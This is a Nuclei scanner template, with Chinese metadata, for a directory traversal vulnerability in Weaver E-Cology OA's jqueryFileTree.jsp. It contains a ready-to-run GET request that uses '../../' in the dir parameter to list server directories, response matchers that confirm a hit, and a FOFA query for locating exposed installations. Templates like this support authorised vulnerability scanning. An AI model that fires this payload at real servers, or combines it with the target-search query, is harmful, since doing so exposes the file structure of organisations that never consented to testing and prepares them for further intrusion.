script_name: 泛微OA E-Cology jqueryFileTree.jsp 目录遍历
content:
# Add your nuclei formatted PoC!
id: E-Cology-jqueryFileTree-directory-traversal

info:
  name: E-Cology directory  traversal
  author: cr
  severity: medium
  description: E-Cology-jqueryFileTree-directory-traversal
  tags: E-Cology,directory traversal

requests:
  - method: GET
    path:
      - '{{BaseURL}}/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "index.jsp"
        part: body

      - type: status
        status:
          - 200
#fofa-query:app="泛微-协同办公OA"
help: 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息
author: cr
online_script_name: 泛微OA E-Cology jqueryFileTree.jsp 目录遍历
